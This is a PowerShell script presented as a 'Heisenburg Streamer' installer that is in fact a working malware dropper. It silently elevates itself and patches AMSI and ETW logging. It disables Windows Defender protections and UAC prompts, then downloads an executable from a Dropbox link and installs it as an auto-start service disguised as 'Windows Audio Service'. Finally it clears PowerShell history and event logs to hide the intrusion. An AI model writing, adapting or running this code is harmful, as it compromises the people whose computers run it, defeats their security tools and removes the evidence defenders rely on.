# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v9.0 (Service Mode)
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        Write-Host ""
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        Write-Host ""
        return $false
    }
}

# 5. ========== SILENT SECURITY BYPASSES (RESTORED) ==========
Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray

try {
    # Windows Defender Bypass
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    
    # UAC Bypass
    $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    
    Write-Host "[+] SECURITY BYPASSES ACTIVATED" -ForegroundColor Green
} catch {
    Write-Host "[!] Some bypasses failed, continuing anyway..." -ForegroundColor Yellow
}

# 6. SERVICE MODE SETUP
Write-Host "[+] INITIALIZING SERVICE MODE..." -ForegroundColor Yellow

# Config
$ServiceName = "WindowsAudioSvc"
$RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
$ExePath = "$env:TEMP\$RandomName.exe"
$NSSMPath = "$env:TEMP\nssm.exe"

# Download Main EXE
Write-Host "[+] Downloading Core Agent..." -ForegroundColor Gray
$downloadSuccess = Invoke-HyperStreamDownload -Url "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1" -TargetPath $ExePath

if (-not ($downloadSuccess)) {
    Write-Host "[!] Download failed!" -ForegroundColor Red
    exit
}

# Download NSSM (Service Manager)
Write-Host "[+] Downloading NSSM..." -ForegroundColor Gray
try {
    Invoke-WebRequest -Uri "https://nssm.cc/release/nssm-2.24.zip" -OutFile "$env:TEMP\nssm.zip" -UseBasicParsing -UserAgent "Mozilla/5.0"
    Expand-Archive -Path "$env:TEMP\nssm.zip" -DestinationPath "$env:TEMP\nssm" -Force
    Copy-Item "$env:TEMP\nssm\nssm-2.24\win64\nssm.exe" $NSSMPath -Force
    Write-Host "[+] NSSM Downloaded Successfully" -ForegroundColor Green
} catch {
    Write-Host "[!] Failed to download NSSM. Using direct EXE fallback..." -ForegroundColor Yellow
}

# Install as Windows Service
Write-Host "[+] Installing as Windows Service..." -ForegroundColor Cyan

if (Test-Path $NSSMPath) {
    # Using NSSM
    & $NSSMPath install $ServiceName $ExePath | Out-Null
    & $NSSMPath set $ServiceName DisplayName "Windows Audio Service" | Out-Null
    & $NSSMPath set $ServiceName Description "Windows Audio Service Helper" | Out-Null
    & $NSSMPath set $ServiceName Start SERVICE_AUTO_START | Out-Null
    & $NSSMPath set $ServiceName AppNoConsole 1 | Out-Null
    & $NSSMPath start $ServiceName | Out-Null
    Write-Host "[+] Service Installed with NSSM" -ForegroundColor Green
} else {
    # Fallback: Create service using sc command
    sc.exe create $ServiceName binPath= $ExePath start= auto DisplayName= "Windows Audio Service" | Out-Null
    sc.exe description $ServiceName "Windows Audio Service Helper" | Out-Null
    sc.exe start $ServiceName | Out-Null
    Write-Host "[+] Service Installed with SC" -ForegroundColor Green
}

Write-Host "`n[+] SUCCESS! Your EXE is now running as Windows Service" -ForegroundColor Green
Write-Host "[*] Service Name: $ServiceName" -ForegroundColor White
Write-Host "[*] Check in Task Manager → Services Tab" -ForegroundColor White
Write-Host "[+] It will auto start with Windows" -ForegroundColor White
Write-Host "[*] EXE is Hidden from Processes Tab" -ForegroundColor White

# 7. CLEANUP
Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
try {
    Remove-Item "$env:TEMP\nssm.zip" -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\nssm" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\nssm.exe" -Force -ErrorAction SilentlyContinue
    
    # Clear PowerShell History
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    
    # Clear Windows Event Logs
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    Write-Host "[+] Forensics Cleaned" -ForegroundColor Green
} catch {
    Write-Host "[!] Cleanup partial" -ForegroundColor Yellow
}

Write-Host "[+] SETUP COMPLETE. SERVICE IS RUNNING.`n" -ForegroundColor Green

# 8. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
